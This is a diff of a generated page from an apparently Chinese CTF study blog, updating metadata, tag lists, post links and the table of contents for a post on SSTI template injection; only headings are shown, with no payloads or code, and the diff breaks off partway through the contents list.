@@ -3,23 +3,26 @@
 <head>
   <meta charset="utf-8">
   <title>ssti模版注入 | MIXBP</title>
-  <meta name="keywords" content=" 学习笔记 , ssti ">
+  <meta name="keywords" content=" ssti , 学习笔记 ">
   <meta name="description" content="ssti模版注入 | MIXBP">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="Signin参考wp 源码 12345678910111213141516171819202122232425262728293031323334353637383940# -*- encoding: utf-8 -*-&#x27;&#x27;&#x27;@File    :   main.py@Time    :   2025&#x2F;03&#x2F;28 22:20:49@Author  :   LamentX">
+<meta name="description" content="CISCN2019华东南赛区-DoubleSecret1打开后看到这样一句话 1Welcome To Find Secret  尝试搜索页面，&#x2F;secret 然后又是提示信息 1Tell me your secret.I will encrypt it so others can&#x27;t see  让我们传入数值，然后他会给我们加密，我们随便输点东西。报错了  1234567891">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Signin">
-<meta property="og:url" content="https://mixbp.github.io/master/2025/04/08/Signin/index.html">
+<meta property="og:title" content="CISCN2019华东南赛区-DoubleSecret1">
+<meta property="og:url" content="https://mixbp.github.io/master/2025/04/15/CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-DoubleSecret1/index.html">
 <meta property="og:site_name" content="MIXBP">
-<meta property="og:description" content="Signin参考wp 源码 12345678910111213141516171819202122232425262728293031323334353637383940# -*- encoding: utf-8 -*-&#x27;&#x27;&#x27;@File    :   main.py@Time    :   2025&#x2F;03&#x2F;28 22:20:49@Author  :   LamentX">
+<meta property="og:description" content="CISCN2019华东南赛区-DoubleSecret1打开后看到这样一句话 1Welcome To Find Secret  尝试搜索页面，&#x2F;secret 然后又是提示信息 1Tell me your secret.I will encrypt it so others can&#x27;t see  让我们传入数值，然后他会给我们加密，我们随便输点东西。报错了  1234567891">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2025-04-08T13:24:15.000Z">
-<meta property="article:modified_time" content="2025-04-08T13:46:36.085Z">
+<meta property="og:image" content="https://mixbp.github.io/image/CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-DoubleSecret1-1.png">
+<meta property="article:published_time" content="2025-04-15T13:39:44.000Z">
+<meta property="article:modified_time" content="2025-04-15T13:54:53.355Z">
 <meta property="article:author" content="MIXBP">
-<meta property="article:tag" content="路径穿越">
-<meta property="article:tag" content="bottle">
-<meta property="article:tag" content="pickle反序列化漏洞">
+<meta property="article:tag" content="刷题笔记">
+<meta property="article:tag" content="信息搜集">
+<meta property="article:tag" content="RC4加密">
+<meta property="article:tag" content="ssti">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://mixbp.github.io/image/CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-DoubleSecret1-1.png">
 
 
 <link rel="icon" href="/img/avatar.jpg">
@@ -118,7 +121,7 @@
     <li>
         <div class="all active" data-rel="All">All
             
-                <small>(82)</small>
+                <small>(90)</small>
             
         </div>
     </li>
@@ -153,8 +156,8 @@
         
     </div>
 </div>
-<input type="hidden" id="yelog_site_posts_number" value="82">
-<input type="hidden" id="yelog_site_word_count" value="166.6k">
+<input type="hidden" id="yelog_site_posts_number" value="90">
+<input type="hidden" id="yelog_site_word_count" value="179k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -204,6 +207,10 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>.haccess</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>\转义单引号</a>
             </li>
         
@@ -217,6 +224,10 @@
         
             <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>报错注入</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>比赛复现</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -264,11 +275,23 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>目录穿越</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>内存马</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>取反绕过</a>
             </li>
         
             <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>日志包含</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>时间盲注</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -320,6 +343,10 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>长度过滤绕过</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>正则表达式</a>
             </li>
         
@@ -352,11 +379,23 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>bottle框架</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>burpsuite爆破密码</a>
             </li>
         
             <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>chr函数构造命令</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>create_function()</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>CVE</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -556,6 +595,14 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>RC4加密</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>RCE</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>regexp注入</a>
             </li>
         
@@ -569,6 +616,10 @@
         
             <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>shell写入</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>sql加号运算注入</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -608,6 +659,10 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>upload</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>waf绕过</a>
             </li>
         
@@ -636,8 +691,80 @@
         
         
         <a  class="All "
-           href="/2025/04/13/TGCTF-2025wp/"
+           href="/2025/04/15/BJDCTF2020-EzPHP/"
+           data-tag="刷题笔记,代码审计,php特性,create_function()"
+           data-author="" >
+            <span class="post-title" title="BJDCTF2020-EzPHP">BJDCTF2020-EzPHP</span>
+            <span class="post-date" title="2025-04-15 22:02:22">2025/04/15</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/04/15/CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-DoubleSecret1/"
+           data-tag="刷题笔记,信息搜集,RC4加密,ssti"
+           data-author="" >
+            <span class="post-title" title="CISCN2019华东南赛区-DoubleSecret1">CISCN2019华东南赛区-DoubleSecret1</span>
+            <span class="post-date" title="2025-04-15 21:39:44">2025/04/15</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/04/15/TGCTF-2025%E5%A4%8D%E7%8E%B0/"
+           data-tag="sql注入,比赛复现,upload,RCE,CVE,目录穿越,内存马,时间盲注"
+           data-author="" >
+            <span class="post-title" title="TGCTF-2025复现">TGCTF-2025复现</span>
+            <span class="post-date" title="2025-04-15 14:10:07">2025/04/15</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/04/14/XYCTF-%E5%87%BA%E9%A2%98%E4%BA%BA%E5%8F%88%E7%96%AF/"
+           data-tag="ssti,比赛复现,bottle框架"
+           data-author="" >
+            <span class="post-title" title="XYCTF-出题人又疯">XYCTF-出题人又疯</span>
+            <span class="post-date" title="2025-04-14 19:51:02">2025/04/14</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/04/14/XYCTF-%E5%87%BA%E9%A2%98%E4%BA%BA%E5%B7%B2%E7%96%AF/"
+           data-tag="ssti,比赛复现,bottle框架,长度过滤绕过"
+           data-author="" >
+            <span class="post-title" title="XYCTF-出题人已疯">XYCTF-出题人已疯</span>
+            <span class="post-date" title="2025-04-14 19:50:50">2025/04/14</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/04/14/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"
            data-tag=""
+           data-author="" >
+            <span class="post-title" title="python反序列化">python反序列化</span>
+            <span class="post-date" title="2025-04-14 19:09:56">2025/04/14</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/04/14/SUCTF2019-EasyWeb/"
+           data-tag="文件上传,.haccess,无字母数字RCE,异或绕过"
+           data-author="" >
+            <span class="post-title" title="SUCTF2019-EasyWeb">SUCTF2019-EasyWeb</span>
+            <span class="post-date" title="2025-04-14 17:33:10">2025/04/14</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/04/14/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Unfinish/"
+           data-tag="刷题笔记,sql盲注,二次注入,sql加号运算注入"
+           data-author="" >
+            <span class="post-title" title="网鼎杯2018-Unfinish">网鼎杯2018-Unfinish</span>
+            <span class="post-date" title="2025-04-14 17:16:41">2025/04/14</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/04/13/TGCTF-2025wp/"
+           data-tag="比赛复现"
            data-author="" >
             <span class="post-title" title="TGCTF-2025">TGCTF-2025</span>
             <span class="post-date" title="2025-04-13 15:53:03">2025/04/13</span>
@@ -654,7 +781,7 @@
         
         
         <a  class="All "
-           href="/2025/04/08/Signin/"
+           href="/2025/04/08/XYCTF2025-Signin/"
            data-tag="路径穿越,bottle,pickle反序列化漏洞"
            data-author="" >
             <span class="post-title" title="Signin">Signin</span>
@@ -952,7 +1079,7 @@
         
         <a  class="All "
            href="/2025/03/24/ssti-flask-labs/"
-           data-tag="学习笔记,ssti"
+           data-tag="ssti,学习笔记"
            data-author="" >
             <span class="post-title" title="ssti-flask-labs">ssti-flask-labs</span>
             <span class="post-date" title="2025-03-24 19:06:24">2025/03/24</span>
@@ -970,7 +1097,7 @@
         
         <a  class="All "
            href="/2025/03/21/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/"
-           data-tag="学习笔记,ssti"
+           data-tag="ssti,学习笔记"
            data-author="" >
             <span class="post-title" title="ssti模版注入">ssti模版注入</span>
             <span class="post-date" title="2025-03-21 21:17:45">2025/03/21</span>
@@ -1159,7 +1286,7 @@
         
         <a  class="All "
            href="/2025/02/23/ctfshow-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"
-           data-tag="学习笔记,信息搜集"
+           data-tag="信息搜集,学习笔记"
            data-author="" >
             <span class="post-title" title="ctfshow-信息搜集">ctfshow-信息搜集</span>
             <span class="post-date" title="2025-02-23 15:24:36">2025/02/23</span>
@@ -1258,7 +1385,7 @@
         
         <a  class="All "
            href="/2025/01/22/upload/"
-           data-tag="学习笔记,文件上传"
+           data-tag="文件上传,学习笔记"
            data-author="" >
             <span class="post-title" title="upload">upload</span>
             <span class="post-date" title="2025-01-22 15:22:47">2025/01/22</span>
@@ -1402,16 +1529,16 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color5">学习笔记</a>
-            
             <a class="color5">ssti</a>
+            
+            <a class="color5">学习笔记</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2025-03-31 22:18:22'>2025-03-21 21:17</time>
+            Created At : <time class="date" title='Updated At: 2025-04-13 21:09:57'>2025-03-21 21:17</time>
         
     </div>
     <div class="article-meta">
@@ -1446,7 +1573,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SSTI%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D"><span class="toc-text">SSTI模版注入漏洞介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%A8%A1%E7%89%88%E7%B1%BB%E5%9E%8B%E6%96%B9%E6%B3%95"><span class="toc-text">判断模版类型方法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#python-jinjia2"><span class="toc-text">python jinjia2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%A4%BA%E4%BE%8B"><span class="toc-text">漏洞示例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#python%E7%BB%A7%E6%89%BF%E5%85%B3%E7%B3%BB%E5%92%8C%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%EF%BC%88%E5%85%B3%E9%94%AE%EF%BC%89"><span class="toc-text">python继承关系和魔术方法（关键）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%A7%E6%89%BF%E5%85%B3%E7%B3%BB%E6%BC%94%E7%A4%BA"><span class="toc-text">继承关系演示</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-text">魔术方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E6%BC%8F%E6%B4%9E"><span class="toc-text">检查漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8ssti%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">利用ssti命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssti%E5%B8%B8%E7%94%A8%E6%B3%A8%E5%85%A5%E6%A8%A1%E5%9D%97"><span class="toc-text">ssti常用注入模块</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-text">文件读取</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E6%89%80%E9%9C%80%E5%AD%90%E7%B1%BB"><span class="toc-text">查找所需子类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FileLoader%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-text">FileLoader的利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0eval%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-text">内建函数eval执行命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#os%E6%A8%A1%E5%9D%97%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%EF%BC%88%E5%B8%B8%E7%94%A8%EF%BC%89"><span class="toc-text">os模块执行命令（常用）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#importlib%E7%B1%BB%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%EF%BC%88%E7%94%A8%E7%9A%84%E4%B8%8D%E5%A4%9A%EF%BC%89"><span class="toc-text">importlib类执行命令（用的不多）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linecache%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-text">linecache函数执行命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#subprocess-Popen%E7%B1%BB%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-text">subprocess.Popen类执行命令</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ssti%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-text">ssti绕过方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E5%8F%8C%E5%A4%A7%E6%8B%AC%E5%8F%B7"><span class="toc-text">绕过过滤双大括号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BEssti"><span class="toc-text">无回显ssti</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%A6%E5%A4%96%E6%B3%A8%E5%85%A5"><span class="toc-text">带外注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BA%AF%E7%9B%B2%E6%B3%A8"><span class="toc-text">纯盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%85%A5%E9%9D%99%E6%80%81%E6%96%87%E4%BB%B6"><span class="toc-text">写入静态文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getitem%E7%BB%95%E8%BF%87%E4%B8%AD%E6%8B%AC%E5%8F%B7%E8%BF%87%E6%BB%A4"><span class="toc-text">getitem绕过中括号过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#getitem-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-text">__getitem__()魔术方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WAF%E8%BF%87%E6%BB%A4-%E4%BE%8B%E9%A2%98"><span class="toc-text">WAF过滤[]例题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#request%E7%BB%95%E8%BF%87%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7%E8%BF%87%E6%BB%A4"><span class="toc-text">request绕过单双引号过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8%E7%BB%95%E8%BF%87%E4%B8%8B%E5%88%92%E7%BA%BF%E8%BF%87%E6%BB%A4"><span class="toc-text">过滤器绕过下划线过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-text">过滤器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flask%E5%B8%B8%E7%94%A8%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-text">flask常用过滤器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#attr%E7%BB%95%E8%BF%87%E4%B8%8B%E5%88%92%E7%BA%BF%E8%BF%87%E6%BB%A4"><span class="toc-text">attr绕过下划线过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E4%BD%BF%E7%94%A8request%E6%96%B9%E6%B3%95"><span class="toc-text">1.使用request方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E4%BD%BF%E7%94%A8unicode%E7%BC%96%E7%A0%81"><span class="toc-text">2、使用unicode编码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81%E4%BD%BF%E7%94%A8%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E7%BC%96%E7%A0%81"><span class="toc-text">3、使用十六进制编码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E3%80%81%E4%BD%BF%E7%94%A8base64%E7%BC%96%E7%A0%81"><span class="toc-text">4、使用base64编码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5%E3%80%81%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-text">5、格式化字符串</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%AD%E6%8B%AC%E5%8F%B7%E7%BB%95%E8%BF%87%E7%82%B9%E8%BF%87%E6%BB%A4"><span class="toc-text">中括号绕过点过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4"><span class="toc-text">绕过关键字过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%9C-%E2%80%9D%E6%8B%BC%E6%8E%A5"><span class="toc-text">“+”拼接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jinjia2%E4%B8%AD%E7%9A%84%E2%80%9D-%E2%80%9D%E6%8B%BC%E6%8E%A5"><span class="toc-text">jinjia2中的”~”拼接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8-1"><span class="toc-text">过滤器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8python%E7%9A%84char"><span class="toc-text">利用python的char()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Length%E8%BF%87%E6%BB%A4%E5%99%A8%E7%BB%95%E8%BF%87%E6%95%B0%E5%AD%97%E8%BF%87%E6%BB%A4"><span class="toc-text">Length过滤器绕过数字过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96config%E6%96%87%E4%BB%B6"><span class="toc-text">获取config文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#config"><span class="toc-text">config</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#current-app"><span class="toc-text">current_app</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B7%B7%E5%90%88%E8%BF%87%E6%BB%A4"><span class="toc-text">混合过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#dict-%E5%92%8Cjoin"><span class="toc-text">dict()和join</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%AC%A6%E5%8F%B7"><span class="toc-text">获取符号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E8%A7%A3%E6%9E%901"><span class="toc-text">实例解析1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E8%A7%A3%E6%9E%902%EF%BC%88WAF%E8%BF%87%E6%BB%A4%E2%80%99%E2%80%99%E2%80%99%EF%BC%8C%E2%80%99%E2%80%9D%E2%80%98%EF%BC%8C%E2%80%99-%E2%80%99%EF%BC%8C%E2%80%99-%E2%80%99%EF%BC%8C%E2%80%99-%E2%80%98%EF%BC%8C%E2%80%99-%E2%80%99%EF%BC%8C%E2%80%99-%E2%80%98%EF%BC%89"><span class="toc-text">实例解析2（WAF过滤’’’，’”‘，’_’，’.’，’[‘，’]’，’ ‘）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%A8%A1%E7%89%88"><span class="toc-text">其他模版</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Twig"><span class="toc-text">Twig</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Smarty"><span class="toc-text">Smarty</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tornado"><span class="toc-text">tornado</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#python-debug-pin%E7%A0%81%E8%AE%A1%E7%AE%97"><span class="toc-text">python debug pin码计算</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pin%E7%A0%81"><span class="toc-text">pin码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pin%E7%A0%81%E7%94%9F%E6%88%90%E5%8E%9F%E7%90%86"><span class="toc-text">pin码生成原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E5%90%8Dusername"><span class="toc-text">1、获取用户名username</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E8%8E%B7%E5%8F%96app%E5%AF%B9%E8%B1%A1name%E5%B1%9E%E6%80%A7"><span class="toc-text">2、获取app对象name属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E8%8E%B7%E5%8F%96app%E5%AF%B9%E8%B1%A1module%E5%B1%9E%E6%80%A7"><span class="toc-text">3、获取app对象module属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E3%80%81mod%E7%9A%84-file-%E5%B1%9E%E6%80%A7"><span class="toc-text">4、mod的__file__属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%E3%80%81uuid"><span class="toc-text">5、uuid</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6%E3%80%81get-machine-id%E8%8E%B7%E5%8F%96"><span class="toc-text">6、get_machine_id获取</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pin%E7%A0%81%E7%94%9F%E6%88%90%E5%85%AD%E5%8F%82%E6%95%B0"><span class="toc-text">pin码生成六参数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pin%E7%A0%81%E8%AE%A1%E7%AE%97%E4%BE%8B%E9%A2%98"><span class="toc-text">pin码计算例题</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SSTI%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D"><span class="toc-text">SSTI模版注入漏洞介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%A8%A1%E7%89%88%E7%B1%BB%E5%9E%8B%E6%96%B9%E6%B3%95"><span class="toc-text">判断模版类型方法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#python-jinjia2"><span class="toc-text">python jinjia2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%A4%BA%E4%BE%8B"><span class="toc-text">漏洞示例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#python%E7%BB%A7%E6%89%BF%E5%85%B3%E7%B3%BB%E5%92%8C%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%EF%BC%88%E5%85%B3%E9%94%AE%EF%BC%89"><span class="toc-text">python继承关系和魔术方法（关键）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%A7%E6%89%BF%E5%85%B3%E7%B3%BB%E6%BC%94%E7%A4%BA"><span class="toc-text">继承关系演示</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-text">魔术方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E6%BC%8F%E6%B4%9E"><span class="toc-text">检查漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8ssti%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">利用ssti命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssti%E5%B8%B8%E7%94%A8%E6%B3%A8%E5%85%A5%E6%A8%A1%E5%9D%97"><span class="toc-text">ssti常用注入模块</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-text">文件读取</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E6%89%80%E9%9C%80%E5%AD%90%E7%B1%BB"><span class="toc-text">查找所需子类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FileLoader%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-text">FileLoader的利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0eval%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-text">内建函数eval执行命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#os%E6%A8%A1%E5%9D%97%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%EF%BC%88%E5%B8%B8%E7%94%A8%EF%BC%89"><span class="toc-text">os模块执行命令（常用）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#importlib%E7%B1%BB%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%EF%BC%88%E7%94%A8%E7%9A%84%E4%B8%8D%E5%A4%9A%EF%BC%89"><span class="toc-text">importlib类执行命令（用的不多）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linecache%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-text">linecache函数执行命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#subprocess-Popen%E7%B1%BB%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-text">subprocess.Popen类执行命令</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ssti%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-text">ssti绕过方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" 